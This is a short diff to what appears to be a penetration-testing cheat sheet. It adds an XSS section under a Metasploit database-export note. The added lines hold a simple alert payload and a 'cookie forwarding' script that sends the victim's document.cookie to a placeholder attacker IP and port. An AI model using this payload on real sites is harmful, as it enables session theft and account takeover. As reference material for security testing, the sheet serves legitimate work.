@@ -301,6 +301,15 @@ Restart metasploit-framework
 ## Export database
 
     db_export -f xml -a /kali-share/metasploit-framework.xml
+    
+# XSS
+
+## Payloads
+### Simple
+    <script>alert('XSS')</script>
+    
+### Cookie forwarding
+    <script>document.write('<img src="http://<attacker-ip>:<listening-port>/?'+document.cookie+'" />');</script>
 
 # Training
 ## Virtual machines
